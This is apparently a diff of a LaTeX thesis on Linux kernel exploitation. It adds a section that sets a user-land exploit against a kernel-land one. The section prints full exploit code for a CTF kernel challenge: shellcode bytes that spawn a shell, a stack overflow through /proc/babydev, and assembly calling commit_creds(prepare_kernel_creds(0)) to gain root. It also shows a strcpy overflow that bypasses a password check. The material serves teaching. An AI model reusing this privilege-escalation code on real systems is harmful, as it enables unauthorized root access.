@@ -53,7 +53,7 @@
 
 \advisor{Giovanni Lagorio}
 
-\examiner{_______ ______}
+\examiner{Alessandro Armando}
 
 \maketitle
 
@@ -119,8 +119,149 @@ The kernel has to control all the hardware on the computer and most of the lower
 abstractions (virtual memory, file systems, IPC facilities, etc.). This implies many hierarchical, interconnected subsystems that the attacker may have to deeply understand to successfully trigger and exploit a specific
 vulnerability. This characteristic can also become an advantage for the exploit developer, as a complex system is also less likely to be bug-free.
 \end{itemize}
-\glnote{qua ci starebbe un esempio di exploit banale, facendo i paralleli con quello che succede in un exploit user-land}
-TO DO...
+\subsection{Example of User-land and Kernel-land exploit}
+\label{subsect:example_of_kernel_user_land}
+
+To understand differences and similarities with user-land, we will show two examples in both environments and we will see similarities and differences. In this case, we will merely consider the file that allows the exploit and what we will be able to obtain by exploiting the vulnerabilities present in the kernel/program.
+
+The CTF ~\cite{m0leconTeaser2020_babyk} uses an unprotected kernel where they provide the source code and the exploited vulnerability is a buffer overflow.
+
+The goal is to read the flag in the directory \textit{/home/user/exp} to overcome the challenge.
+
+\begin{lstlisting}
+#define MAP_PRIVATE     0x02    /* Changes are private.  */
+#define MAP_FIXED       0x10    /* Interpret addr exactly.  */
+#define MAP_ANONYMOUS   0x20    /* Don't use a file.  */
+#define O_RDWR        0x0002  /* open for reading and writing */
+
+typedef unsigned long long qword;
+
+extern void kernel_shellcode();
+char user_shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
+
+qword mcpy(char * dst, char * src, qword n)
+{
+    for (qword i = 0; i < n; ++i)
+        dst[i] = src[i];
+  return n;
+}
+
+void * mmap(void * addr, qword size, qword prot, qword flags)
+{
+    return syscall64(9, addr, size, prot, flags, -1, 0);
+}
+int _start (int argc, char **argv) 
+{
+  char buf[0x1000];
+  char * payload = buf;
+    // Prepare memory for ret2usr
+  void *userland_stack = mmap((void *)0xcafe000, 0x1000, 7, MAP_ANONYMOUS|MAP_PRIVATE|0x0100);
+  void *userland_code = mmap((void *)0x1234000, 0x1000, 7, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE);
+  mcpy(userland_code, &user_shellcode,sizeof(user_shellcode));
+
+    // Fill up stack until saved_rip
+  for (int i = 0;  i < 124; i++)
+    *(payload++) = 'A';
+  *(qword *)payload = (qword) kernel_shellcode; payload += 8;
+  // Profit
+  int vuln_fd = syscall64(2, "/proc/babydev", O_RDWR,100,0, 0,0);
+  syscall64(1, vuln_fd, buf, payload - buf, -1,-1,-1);
+  syscall64(0x60, 0, -1,-1,-1,-1,-1);
+  return 0;
+}
+\end{lstlisting}
+\begin{lstlisting}
+.text
+.intel_syntax noprefix
+
+.global syscall64
+.global kernel_shellcode
+
+kernel_shellcode:
+    # commit_cred(prepare_kernel_creds(0))
+    xor rdi, rdi
+    mov rcx, 0xffffffff81052a60     # cat kallsyms | grep prepare_kernel_creds
+    call rcx
+    mov rdi, rax
+    mov rcx, 0xffffffff81052830     # cat kallsyms | grep commit_creds
+    call rcx
+context_switch:
+    swapgs
+    # ss
+    mov r15, 0x2b
+    push 0x2b 
+    # rsp - mmapped value
+    mov r15, 0xcafe000
+    push r15
+    # rflags - dummy value
+    mov r15, 0x246
+    push r15
+    # cs
+    mov r15, 0x33
+    push r15
+    # rip - mmapped value
+    mov r15, 0x1234000
+    push r15
+    iretq
+end_kernel_shellcode:
+    nop
+
+syscall64:
+    pop r14
+    pop r15
+    push r15
+    push r14
+    sub rsp, 0x100
+
+    mov rax, rdi
+    mov rdi, rsi
+    mov rsi, rdx
+    mov rdx, rcx
+    mov r10, r8
+    mov r8,r9 
+    mov r9, r15
+    syscall
+
+    add rsp, 0x100
+    ret
+\end{lstlisting}
+
+The codes above allow you to gain root privileges by taking control of the saved rip by returning the kernel to the user mapped code \textit{user_shellcode} and executing \texttt{commit_creds(prepare_kernel_creds(0))} without crashing the kernel by generating a shell and reading the flag.
+
+Let's consider this user agent instead:
+\begin{lstlisting}
+#include <stdio.h>
+#include <string.h>
+int check (char *pwd) {
+  int auth_flag = 0;
+  char pwd_buffer [ 16 ] ;
+  strcpy ( pwd_buffer , pwd) ;
+  if ( strcmp ( pwd_buffer , "sonoio" ) == 0 )
+    auth_flag = 1;
+  return auth_flag ;
+}
+int main ( int argc , char *argv [ ] ) {
+  if (check ( argv [ 1 ] ) )
+    printf ( "AUTHENTICATED!\n" ) ;
+  else
+    printf ( "ACCESSO NEGATO!\n" ) ;
+}
+\end{lstlisting}
+If such code, executed without the stack protector \texttt{-fno-stack-protector}, is passed either \textit{sonoio} or \textit{AAAAAAAAAAAAAAAAAA} we get \textit{AUTHENTICATED}.
+This is because if I exceed the size of the buffer I overwrite the next variable in memory, in this case, \textit{auth_flag}, which becomes different from 0 and therefore passes the final test.
+
+In both cases, we overflow the buffer, but let's take a closer look at what we do.
+
+In the first case, we have total access to the system, allowing us to move around it at will.
+With this level of permissions, it is possible to take control of the security system and render it useless by applying patches to all integrity checks that are done by the system.
+We can read the flag because we have root privileges.
+
+In the second case instead, it allows us to explore the system with limited permissions, we can execute unauthorized code where it was not possible before. Which translates into the ability to use emulators or write your programs. In the example above, however, we can "authenticate" by bypassing the present control.
+
+
+These two examples allow us to understand how a kernel-land exploit is much more powerful and invasive than a user-land exploit.
+
+
 \chapter{Analysis Environment}
 \label{ch:analyze}
 
@@ -864,7 +1005,7 @@ int main(){
    \label{waitid_show}
 \end{figure} 
 
-The value of \textit{si\_uid} set to 0 \glnote{use 0 or zero?} After the function call, thus in a hypothetical scenario where the attacker is able to manipulate this structure, he will get for the process corresponding to its root privileges.
+The value of \textit{si\_uid} set to 0 \vtnote{use 0 or zero?} After the function call, thus in a hypothetical scenario where the attacker is able to manipulate this structure, he will get for the process corresponding to its root privileges.
 
 \section{Verify the bug}
 \label{sect:bug}
@@ -1051,7 +1192,7 @@ stack=malloc(STACK_SIZE)+STACK_SIZE;
 
 PoC is not very complex: just create many threads and start overwriting at an arbitrary address. Our threads will only have to "check” their UID and do "something” in case it changes.
 
-Inizialmente creiamo dei processi con il pezzo di codice visto nella \refToSubSection{spraying} che eseguono tutti la funzione \texttt{spray_thread}.
+Initially we create processes with the piece of code seen in the \refToSubSection{spraying} which all execute the \texttt{spray_thread} function.
 \begin{lstlisting}
 struct shared_area{
   int one_win;
